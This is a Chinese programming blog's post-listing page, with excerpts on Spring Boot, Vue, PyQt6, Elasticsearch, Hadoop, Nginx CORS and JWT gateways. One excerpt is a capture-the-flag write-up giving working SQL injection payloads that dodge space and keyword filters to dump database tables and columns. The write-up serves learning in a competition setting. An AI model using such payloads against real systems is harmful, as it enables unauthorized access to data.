<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94c4fb6cbd9488c507756964e0484ad6/" rel="bookmark">
			idea2023.2.X创建springboot项目时无法选择java8
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		心血来潮从2019.3 升级到了2023.2 创建springboot项目的时候发现
这里只能选17与21 其实可以通过升级jdk来解决 但是 就是想使用java8怎么办?
解决:
将这个地方换成:https://start.aliyun.com 使用阿里的这个镜像就好了 别忘了springboot3以上就不支持jdk8了 推荐2.7.X哦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/227a95bf40f72f4ba19657453559df89/" rel="bookmark">
			[SWPUCTF 2022 新生赛]ez_sql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参数为1的时候没有报错，为2和任何数的时候报，发现空格被过滤了，然后union需要双拼写
4'/**/ununionion/**/select/**/1,2,3;#
发现存在3个
数据库为NSS_db
它的表有两个为，NSS_tb和users
nss=2'/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='NSS_db';#
查表的字段发现flag
nss=2'/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb';#
查字段的数据
nss=2'/**/ununionion/**/select/**/1,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_tb;#
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49901c89cca8740e1952a92f8e0053e6/" rel="bookmark">
			PyQt6运行QTDesigner生成的ui文件程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024版 PyQt6 Python桌面开发 视频教程(无废话版) 玩命更新中~_哔哩哔哩_bilibili2024版 PyQt6 Python桌面开发 视频教程(无废话版) 玩命更新中~共计18条视频，包括：2024版 PyQt6 Python桌面开发 视频教程(无废话版) 玩命更新中~、第2讲 PyQt6库和工具库QTDesigner安装与配置、第3讲 PyQt6第一个程序HelloWorld实现等，UP主更多精彩视频，请关注UP账号。https://www.bilibili.com/video/BV11C4y1P7fj/
首先我们用QTDesigner设计一个简单UI。
保存ui文件，放到项目里面去。
我们通过PyQt6包里面的uic来加载ui文件
""" python加载ui文件 作者 : 小锋老师 官网 : www.python222.com """ import sys ​ from PyQt6.QtWidgets import QApplication from PyQt6 import uic ​ if __name__ == '__main__': app = QApplication(sys.argv) ui = uic.loadUi("./ui文件.ui") ui.show() ​ sys.exit(app.exec()) 后续我们会继续深入讲解，我们可以在当前代码里获取到ui文件里的所有控件，对控件属性以及行为进行设置操作。
以后标准开发，依然是建议通过这种界面与操作分离的方式进行项目开发，有利于分工明确，以及后期方便维护。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/718e0dc3741c26b473de7aab09fbbf29/" rel="bookmark">
			Vue3：computed()简单使用及使用computed格式化时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		computed 接受一个 getter 函数，返回一个只读的响应式 ref 对象。该 ref 通过 .value 暴露 getter 函数的返回值。它也可以接受一个带有 get 和 set 函数的对象来创建一个可写的 ref 对象
computed（是组合式api，用时引入）
&lt;script setup&gt; import {ref,computed} from 'vue'; //创建一个只读的计算属性 ref const count = ref(1) const plusOne = computed(() =&gt; count.value + 1) console.log(plusOne.value) // 2 plusOne.value++ // 错误 //创建一个可写的计算属性 ref const count = ref(1) const plusOne = computed({ get: () =&gt; count.value + 1, set: (val) =&gt; { count.value = val - 1 } }) plusOne.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/718e0dc3741c26b473de7aab09fbbf29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7a53dc3b13ae6791c6cfe971258c352/" rel="bookmark">
			新版画中画documentPictureInPicture API使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 关于该API，chrome dev有一篇比较好入门的文章，如果你没看过强烈推荐你先看这篇基础用法，该文章只针对API的特性和chrome dev文章进行扩展性说明。
提前说明，目前该API是非w3c草案功能，从chrome 116开始已经强推到stable上了，你可以先在这看看你的浏览器能不能用，如果你的浏览器低版本chrome，可以地址栏到chrome://flags/#document-picture-in-picture-api这里看能不能开启
基本用法 .d.ts
interface Window { documentPictureInPicture: { window: Window requestWindow: (options?: { width: number height: number }) =&gt; Promise&lt;Window&gt; onenter: () =&gt; void } } 直接调用documentPictureInPicture.requestWindow就可以弹出这样的画中画
这里非常不推荐用edge，都119版本了还是这样红色tab没法改，而且点左上角的证书信息有大概率浏览器崩溃，且其中运行的dom容易卡顿。问了reddit和edge support一直没有回信，已经放弃了
扩展说明 documentPictureInPicture.window和documentPictureInPicture.requestWindow()返回的window !== top，且有2个使用限制 HTTPS或file协议(这个好像是118后加上的，之前测试都没有出现过)top window才能调用API 该window相当于打开了一个同源iframe，限制规则也基本等同，在窗口中可以打开独立的devTools用{width,height}打开的画中画高度有偏差，好像还是不固定的，我另一台电脑宽高差8，这台差8,16
实际使用案例 在这个API刚出来前我是在用canvas + requestPictureInPicture搞了个能播放弹幕的画中画
canvas模式
但实际用起来很不方便，想要跳进度条只能搞全局快捷键或者配置MediaSession增加画中画功能按钮，也就只能一点一点跳；而且MediaSession就那几个按钮也玩不出什么花，很多播放器该有的功能都实现不了。
自从出了documentPictureInPicture API，就可以自定义播放器了，拖拽进度条，发送弹幕，侧边栏切换视频功能都可以在画中画实现了😎
pip模式
最后打个小广告吧 这个播放器插件已经在插件商店里上架了，欢迎各位下载给个好评😀
chrome商店edge商店(上面提了，体验不太好)github 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a28eceece0e534e39696a937753ae518/" rel="bookmark">
			滚雪球学Java(09-10)：Java中的Lambda运算符，你真的掌握了吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		咦咦咦，各位小可爱，我是你们的好伙伴——bug菌，今天又来给大家普及Java SE相关知识点了，别躲起来啊，听我讲干货还不快点赞，赞多了我就有动力讲得更嗨啦！所以呀，养成先点赞后阅读的好习惯，别被干货淹没了哦~
🏆本文收录于「滚雪球学Java」专栏，专业攻坚指数级提升，助你一臂之力，带你早日登顶🚀，欢迎大家关注&amp;&amp;收藏！持续更新中，up！up！up！！
环境说明：Windows 10 + IntelliJ IDEA 2021.3.2 + Jdk 1.8 文章目录 前言摘要Java-Lambda运算符简介源代码解析应用场景案例优缺点分析类代码方法介绍测试用例测试代码演示测试结果测试代码分析 全文小结 总结附录源码 ☀️建议/推荐你📣关于我 前言 在Java 8发布之前，Java语言一直被人诟病着缺乏现代语言的特性，难以胜任现代大型应用的开发。而Lambda运算符的引入，使得Java语言拥有了一种支持函数式编程的能力，大大简化了代码的编写和阅读。
摘要 本文将介绍Java中的Lambda运算符的概念及用法。首先，我们将简单介绍Lambda表达式的语法，然后通过源代码分析来解释Lambda的工作方式。接着，我们将探讨Lambda表达式的应用场景，并对其优缺点进行深入分析。最后，我们将介绍Java中Lambda运算符的使用方法，以及如何编写测试用例来验证Lambda表达式的正确性。
Java-Lambda运算符 简介 在Java中，Lambda表达式可以看作是一种匿名函数，它不需要使用关键字“function”来进行定义，而是使用“-&gt;”符号来表示。Lambda表达式的主要特点就是可以在不定义形式参数和返回值类型的情况下，直接定义一个函数，并将其赋值给一个变量或者一个函数接口。Lambda表达式的语法格式如下：
(parameters) -&gt; expression 或者
(parameters) -&gt; { statements; } 其中，parameters表示形式参数列表，可以为空或者包含多个参数，expression表示表达式或者语句块，其中如果有多条语句，需要使用大括号括起来。在这个表达式或语句块中，可以使用Lambda运算符左侧的形式参数定义，也可以使用Java中的变量和方法。右侧的表达式或者语句块必须返回一个值或者执行一个操作，可以是任意类型的数据。
源代码解析 为了更好地理解Lambda表达式的工作方式，我们可以通过一个简单的示例来进行源代码解析。假设我们有一个字符串列表，我们需要将其中长度大于3的字符串全部转换为大写并输出。传统的Java代码可能会写成这样：
List&lt;String&gt; list = Arrays.asList("apple", "banana", "orange", "peach"); for(String str : list) { if(str.length() &gt; 3) { String upper = str.toUpperCase(); System.out.println(upper); } } 使用Lambda表达式，可以简化这段代码的写法。代码如下：
List&lt;String&gt; list = Arrays.asList("apple", "banana", "orange", "peach"); list.stream().filter(str -&gt; str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a28eceece0e534e39696a937753ae518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3faab3d93c6a081ef1fd9d9bdbf6dd70/" rel="bookmark">
			自定义ES分词器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 分词器的组成 ES的分词器主要由三部分组成：
（1）原始文本处理-charactor filters
对原始文本进行处理。
（2）切词-tokenizer
按照规则进行切词。
（3）单词处理-token filters
将切词获取的单词进行加工。如大小写转化，删除stopwords,增加同义词等。
2 自定义分词 下面是一个自定义分词器的案例，自定义分词器的以上三部分内容。
# custom_analyzer - 自定义分词器的名称 # char_filter - 原始文本预处理 # tokenizer - 按照指定的规则切词 # filter - 将切词后的结果进行加工 # _english_ 英文停用词，如 a,an,the PUT /test_analyzer_index_001 { "settings": { "analysis": { "analyzer": { "custom_analyzer":{ "type":"custom", "char_filter":["emoticons"], "tokenizer": "threeVerticalLine", "filter":["english_stop"] } }, "char_filter": { "emoticons":{ "type" : "mapping", "mappings" : [ ":) =&gt; _happy_", ":( =&gt; _sad_" ] } }, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3faab3d93c6a081ef1fd9d9bdbf6dd70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0611e911f7dec76008d8574b4b81814/" rel="bookmark">
			Vue.js devtools插件：超实用的浏览器扩展，使项目更容易地调试和优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 常用功能列表： 组件树查看：允许用户查看完整的 Vue 组件层次结构，以及每个组件的属性、数据、计算属性和插槽。
实时编辑：在 Devtools 中直接修改组件的数据，可以立即在应用中看到变化。事件追踪：查看组件之间的事件传递，帮助理解和调试组件间的交互。Vuex 集成：如果应用使用了 Vuex，可以在 Devtools 中查看、追踪和编辑应用的状态。性能分析：提供组件渲染的性能数据，帮助找到和解决性能瓶颈。插件支持：可以集成第三方 Vue 插件，为开发者提供更多的调试工具。定制设置：允许开发者根据自己的喜好调整 Devtools 的外观和行为。 下载和安装： Vue.js devtools | Chrome扩展 - Crx搜搜
用你最喜欢用来调试项目的浏览器打开链接，点击安装按钮，具体安装步骤点击2查看。
安装成功后在浏览器的顶部“扩展”区域可以看到已安装好的插件
基础使用： 安装完后f12打开开发者工具，你可以在浏览器顶部找到vue选项卡 。
在 "Vue" 选项卡中，你会首先看到你的组件树。这显示了你应用中所有组件的层次结构。你可以展开或折叠每个组件来查看其子组件。 当你在组件树中点击某个组件时，右侧的面板会显示该组件的详细信息。在 "Data" 选项卡中，你可以看到组件的 data、props、computed properties 和 methods。
Data: 显示组件的内部数据。Props: 显示从父组件传递给当前组件的属性。Computed: 显示组件的计算属性。Methods: 显示组件的方法。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/414dd4e9414e80bd95c415938191097d/" rel="bookmark">
			启动hadoop报异常Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原异常：
[zcs2312@hadoop101 sbin]$ ./start-dfs.sh
Starting namenodes on [hadoop101]
hadoop101: Warning: Permanently added ‘hadoop101,192.168.198.101’ (ECDSA) to the list of known hosts.
hadoop101: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
Starting datanodes
localhost: Warning: Permanently added ‘localhost’ (ECDSA) to the list of known hosts.
localhost: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
Starting secondary namenodes [hadoop101]
hadoop101: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
原因分析：没有生成、配置公匙，分发给自己
解决方法：
执行以下命令，然后连续点三下回车生成SSH密匙对
ssh-keygen -t rsa 把密匙对分发给本机，让本机可以免密登录
ssh-copy-id $(hostname) 然后再去重新启动hadoop
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d93b72c8784a3f8ade6989929e8432a5/" rel="bookmark">
			【C&#43;&#43;初阶】STL之学习string的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言：一、认识下string1.1 什么是string1.2 为什么要有string 二、string 类的接口使用2.1 初始化与析构2.1.1 初始化2.1.2 析构 2.2 容量操作2.2.1 长度大小——size和length2.2.2 空间总大小——capacity2.2.3 判空——empty2.2.4 清空——clear2.2.5 预留空间——reserve2.2.6 改变有效字符个数、填充多余空间——resize 2.3 遍历访问2.3.1 下标遍历——operator[]2.3.2 范围for2.3.3 迭代器遍历——iterator 2.4 修改操作2.4.1 尾插字符——push_back2.4.2 尾插字符串——append2.4.3 字符串追加字符串——operator+=2.4.4 赋值——assign2.4.5 插入——insert2.4.6 删除——erase2.4.7 查找——find2.4.8 替换——replace2.4.9 返回C格式字符串——c_str2.4.10 截取字符串——substr 2.5 输入操作2.5.1 获取一行字符串——getline 前言： STL是C++的标准模板库，里面包含了许多算法和数据结构，例如我们熟悉的顺序表、链表、栈和队列以及一些常见的算法等等，编程者想使用这些就可以直接从库中调用，不必再自己造轮子了。
下面为STL内容的一张图：
接下来，我们要学习STL中的string。
一、认识下string 1.1 什么是string string 是C++的一个类模板，字符串的类模板。要定义一个对象为字符串，就可以用string类型，说明它是一个字符串，相当于字符数组。
int main() { string s1("hello yss"); return 0; } 1.2 为什么要有string 以前我们用C语言写代码的时候，假如字符串如果要计算它的长度，必须要调用C标准库中的函数才行。但是这些函数与字符串本身是分开的，与C++面向对象的思想不契合，而且很容易出现越界等错误，所以C++提供了string类，类里就有我们想使用的函数来操作字符串，我们只需要调用类的接口（函数）即可，更加简洁。
二、string 类的接口使用 string类有许多接口，这里只介绍一些常见的。
2.1 初始化与析构 2.1.1 初始化 1️⃣无参与有参
int main() { string s1();//无参 空字符串 string s2("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d93b72c8784a3f8ade6989929e8432a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6535d850a6bd8d8d8bf6a983135557b/" rel="bookmark">
			前后端分离项目—通用后台管理系统（Vue &#43; SpringBoot）【七】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 通用后台管理系统 该系统主要结合Element组件编辑前端，后端实现业务逻辑，组成一个简单的前后端分离项目。
该部分动态背景功能的实现
使用vanta.js
效果：
代码 通过ref绑定
&lt;div ref="vantaRef"&gt;&lt;/div&gt; import * as THREE from 'three' import BIRDS from 'vanta/src/vanta.birds' export default { name: 'App', mounted() { this.vantaEffect = BIRDS({ el: this.$refs.vantaRef, THREE: THREE, wingSpan: 34, backgroundColor:0xccfef4, }) }, beforeDestroy() { if (this.vantaEffect) { this.vantaEffect.destroy() } }, } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/219416c6b684c50676e46d5e51f7e315/" rel="bookmark">
			前后端分离项目—通用后台管理系统（Vue &#43; SpringBoot）【六】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通用后台管理系统 该系统主要结合Element组件编辑前端，后端实现业务逻辑，组成一个简单的前后端分离项目。
该部分介绍调用远程服务器python代码功能的实现
场景：有一台远程linux服务器，存放了yolo检测的代码，将该功能包装进项目中
前端 页面 &lt;template&gt; &lt;div&gt; &lt;el-col :span="12" style="padding-right: 50px;padding-left: 50px"&gt; &lt;el-card class="select-card"&gt; &lt;p style="color: #1fb1ec"&gt; 指针式仪表识别&lt;/p&gt; &lt;p style="color: #1fb1ec; margin-top:5px; margin-bottom: 30px"&gt;&lt;br&gt; 下方上传视频文件&lt;/p&gt; &lt;!--上传视频部分--&gt; &lt;el-upload class="avatar-uploader" :action=uploadPath :file-list="fileList" :before-upload="beforeUploadVideo" :on-progress="uploadVideoProcess" :on-success="uploadSuccess" :show-file-list="false" style="padding-top: 10px"&gt; &lt;video v-if="videoForm.showVideoPath !== '' &amp;&amp; !videoFlag" v-bind:src="videoForm.showVideoPath" class="avatar video-avatar" controls="controls"&gt; 您的浏览器不支持视频播放 &lt;/video&gt; &lt;i v-else-if="videoForm.showVideoPath === '' &amp;&amp; !videoFlag" class="el-icon-plus avatar-uploader-icon" &gt;&lt;/i&gt; &lt;/el-upload&gt; &lt;el-progress v-if="isShowUploadVideo" :percentage="videoUploadPercent" style="margin-top: 7px; width: 520px; margin-left: 10vh"&gt;&lt;/el-progress&gt; &lt;!--分析部分--&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/219416c6b684c50676e46d5e51f7e315/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aef6795700e5a4a7a9c56cbf9c405757/" rel="bookmark">
			使用PhpStudy配置Nginx解决跨域问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系统：Windows
如果你是用phpstudy来进行lnmp的集成环境，你想解决跨域问题是很简单的：
处理步骤：第一步：找到你前端要请求的后端接口的url的域名：
比如：http://localhost2/index.php/index/test/helloworld 那么域名就是localhost2 第二步：找到域名对应的nginx配置文件位置
打开phpstudy
进入conf目录
进入vhosts目录
找到域名对应的配置文件了
步骤三：修改该配置文件，并重启！！！重启！！！
先复制这段配置项
add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } 粘贴在红框标志处，并保存。
然后重启nginx
重新请求接口就返回正常结果了，反正我是这样哈~
补充：
1.关于什么是跨域问题：
从一个域名的网页去请求另一个域名的资源。本质上对于此类请求，只要协议、域名、端口有任何一个的不同，就被当作是跨域，即都被当成不同源。(出自文档)
2.关于复制粘贴的那段配置是什么意思↓Nginx配置跨域请求Access-Control-Allow-Origin * 详解
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b93b786aadedb62e72e2df97ec74585/" rel="bookmark">
			前后端分离项目—通用后台管理系统（Vue &#43; SpringBoot）【五】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通用后台管理系统 该系统主要结合Element组件编辑前端，后端实现业务逻辑，组成一个简单的前后端分离项目。
该部分介绍调用讯飞星火大模型的图片识别API功能的实现
前言：讯飞开放平台提供了一些免费的api供学习使用，可以包装进该项目中。例如图像识别api，前端上传图片，调用讯飞的api，然后返回结果。
讯飞开放平台地址：https://www.xfyun.cn/
该项目使用图像识别中的物体识别api：http://tupapi.xfyun.cn/v1/currency
文档链接：https://www.xfyun.cn/doc/image/object-recg/API.html
文档中有调用示例，选择java语言，因为识别的类别有点多，可以将下载的详细对照表写进数据库中，然后取结果的时候进行sql查询
前端 页面效果 在卡片中设置了一个选择框，选择不同的模型；模型的不同，卡片的内容显示也不一样。（目前只做了星火大模型）
识别效果：点击上传-&gt;选择图片文件-&gt;上传完成展示图片信息-&gt;显示识别结果
因为星火模型的要求，上传的图片大小要小于800kb。
前端代码 页面部分
&lt;template&gt; &lt;div&gt; &lt;!--左侧 --&gt; &lt;el-col :span="8" style="padding-right: 10px; padding-left: 50px"&gt; &lt;el-card class="select-card"&gt; &lt;span style="color: #1fb1ec"&gt;选择模型：&lt;/span&gt; &lt;!--选择模型框--&gt; &lt;div&gt; &lt;el-select v-model="value" placeholder="select your model" @change="selectChanged"&gt; &lt;el-option v-for="item in options" :key="item.value" :label="item.label" :value="item.value"&gt; &lt;/el-option&gt; &lt;/el-select&gt; &lt;/div&gt; &lt;div id="recPicApi" style="display: none"&gt; &lt;!--上传照片部分--&gt; &lt;div id="upPicId" style="padding-top: 30px"&gt; &lt;span style="color: #1fb1ec"&gt;上传需要识别的图片：&lt;/span&gt; &lt;el-upload class="upload-demo" :action=uploadPath :file-list="fileList" :on-success="uploadSuccess" list-type="picture" style="padding-top: 10px"&gt; &lt;el-button @click='uploadMethod' size="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b93b786aadedb62e72e2df97ec74585/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64f2390dd437efe84269f6c44673516a/" rel="bookmark">
			批量解决 “字段【XXX】必须使用javadoc形式的注释” 问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用正则式替换方法，将注释批量转化为javaDoc格式：将//注释转化为/*...*/格式
目录
前言
一、解决步骤
1.按Ctrl+R：替换，打开替换框（注意要打开替换框中的正则表达式选项）
2.输入需要替换的内容和想要替换的结果的正则表达式
前言 代码扫描规范时出现的问题，如下图：
规范后的代码：
一、解决步骤 1.按Ctrl+R：替换，打开替换框（注意要打开替换框中的正则表达式选项） 2.输入需要替换的内容和想要替换的结果的正则表达式 如我需要将“//XXXX”的注释转化为“/*XXX*/”的注释：
//注释的正则表达式：(圆括号用于分组，"."用于匹配字符，"*"限定匹配字符为任意次）
//(.*) /*...*/注释的正则表达式：(可根据需要调整正则表达式，\n为换行符，"$1"指正则表达式中第一个用圆括号括起来的子表达式的匹配结果）
/**\n *$1\n */ 可以看到上图绿框选中匹配了我想要替换的注释内容
3.点击替换框中Replace All选项，替换全部选中内容，就可以实现批量修改注释格式啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05919cdf4e970ef365488b935539567d/" rel="bookmark">
			Java8 对象List 排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.stream流式排序
1.使用说明:
2.多字段排序
2.Collections.sort(......) 排序
1.stream流式排序 Java8提供了流式操作来简化我们的编程，比如排序、分组、过滤、Map操作等API，配合Lambda表达式给我们编程带来了很大的便利，这篇文章重点介绍Stream流式排序功能--&gt; list.stream().sorted(......)。
功能说明：能够使用自然序，或着实现Comparator 函数接口来自定义排序规则。
1.使用说明: 自然序排序stream().sorted()，List中的元素需要实现Comparable 接口，例如String，通常我们自己定义的类是没有实现这个接口的。自定义排序stream().sorted(Comparator&lt;? super T&gt; comparator)，如果我们自定义的类没有实现Comparable接口，那么就可以使用这种方式，使用Lambada 来创建一个Comparator (函数接口)实例，并且可以根据需要进行升序、降序排列 官网简单示例:
#自然序排序一个list list.stream().sorted() #自然序逆序元素，使用Comparator 提供的reverseOrder() 方法 list.stream().sorted(Comparator.reverseOrder()) # 使用Comparator 来排序一个list list.stream().sorted(Comparator.comparing(Student::getAge)) # 颠倒使用Comparator 来排序一个list的顺序，使用Comparator 提供的reverseOrder() 方法 list.stream().sorted(Comparator.comparing(Student::getAge).reversed()) 2.多字段排序 通过Comparator.thenComparing(Comparator&lt;? super T&gt; comparator) 实现
1.简单字符串排序(数字排序也一样)
先以客户编码排序，再以产品信息排序
List&lt;Customer&gt; customerListNew = customerList.stream() .sorted(Comparator.comparing(Customer::getCustomerCode) .thenComparing(Customer::getProductSeries) ).collect(Collectors.toList()); 2.区分升序和降序
通过Comparator.thenComparing(Comparator&lt;? super T&gt; other) 实现多字段排序使用Comparator.reverseOrder() 做为thenComparing方法的参数，实现降序 先以年龄的升序排序，再以地域降序Comparator.reverseOrder()
List&lt;Customer&gt; customerListNew = customerList.stream() .sorted(Comparator.comparing(Customer::getAge) .thenComparing(Customer::getArea, Comparator.reverseOrder()) ).collect(Collectors.toList()); 3.字符串转数字排序
有的情况下，需要将字符串转为数字进行排序，这时候该怎么办呢？使用Lambda表达式.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05919cdf4e970ef365488b935539567d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea7928e1749cd37b117052028b3823d8/" rel="bookmark">
			前后端分离项目—通用后台管理系统（Vue &#43; SpringBoot）【四】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通用后台管理系统 该系统主要结合Element组件编辑前端，后端实现业务逻辑，组成一个简单的前后端分离项目。
该部分介绍面包屑功能的实现
页面 Element也有这个组件，直接使用el-breadcrumb
&lt;!--面包屑--&gt; &lt;el-breadcrumb separator="/" &gt; &lt;el-breadcrumb-item class="myColor" v-for="item in tags" :key="item.path" :to="{ path: item.path }"&gt;{{item.label}}&lt;/el-breadcrumb-item&gt; &lt;/el-breadcrumb&gt; 点击菜单功能
handleMenu() { this.$store.commit('collapseMenu') } computed: { // ... 解构 ...mapState({ tags: state =&gt; state.tab.tabsList }) } 顶栏 顶栏页面如下：左端有个菜单按钮，点击可以折叠左栏的菜单栏，右端放个小logo，当前所在页面高亮显示。
&lt;template&gt; &lt;div class="header-content"&gt; &lt;div class="l-content"&gt; &lt;el-button style="margin-right: 20px" @click="handleMenu" icon="el-icon-menu" size="medium"&gt;&lt;/el-button&gt; &lt;!--面包屑--&gt; &lt;el-breadcrumb separator="/" &gt; &lt;el-breadcrumb-item class="myColor" v-for="item in tags" :key="item.path" :to="{ path: item.path }"&gt;{{item.label}}&lt;/el-breadcrumb-item&gt; &lt;/el-breadcrumb&gt; &lt;/div&gt; &lt;div class="r-content"&gt; &lt;el-dropdown&gt; &lt;span class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea7928e1749cd37b117052028b3823d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6fd276af14d1dbdd4862a08f312c9afe/" rel="bookmark">
			搭建Gateway网关并加入Token鉴权逻辑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		已经将近三个月没写博客了，实在是没什么时间去写，今天来继续完善我的脚手架吧，以后尽量加快更新速度哈哈哈。 前言：今天来完善我们的鉴权逻辑，至于之前在RBAC那篇文章写的通过鉴权中心的方案，另外开一个鉴权服务有点复杂，要设置各种回调机制、熔断机制、失败重试机制等等，所以我们在这里的方案采用的是：在网关处鉴权。
Step1： 引入JWT相关依赖。 &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;${jjwt.version}&lt;/version&gt; &lt;/dependency&gt; 我们使用的是jjwt这个Token工具依赖，直接把这个依赖加入到公共core模块中，以便于全局都能够调用。
Step2：Gateway模块构建JWT所需配置的配置类 首先，我们要知道Token在系统中的作用：
①身份验证：客户端向服务端提交请求时，通常会在请求的头部附带Token来验证用户的身份，通过有效的Token，服务端可以知道该请求来自哪个用户。
②会话管理：由于HTTP协议是无状态的，为了跟踪用户的会话状态，服务端可以返回一个Session Token到客户端，后续客户端的每次请求都会带上这个Token，以此来确认用户的会话信息。
③安全性：使用Token认证的方式，避免了用户密码在网络间传输，增加了系统的安全性。此外，Token还可以设置过期时间，增加系统防止恶意攻击的能力。
知道以上几点后，我们可以开始构建我们的Token认证体系，由于鉴权是个非常频繁的操作，我们采用了Redis缓存进行验证，所以我们需要以下几个必要的属性：
①Token加密秘钥：tokenKey
②请求头携带token指定的名称：tokenHeaderName
③token过期时间：tokenExpiration
以上几个变量名都可以随便取，代码如下：(下面的代码可能会多出几个其它属性，我们这里只关注上面提到的这三个)
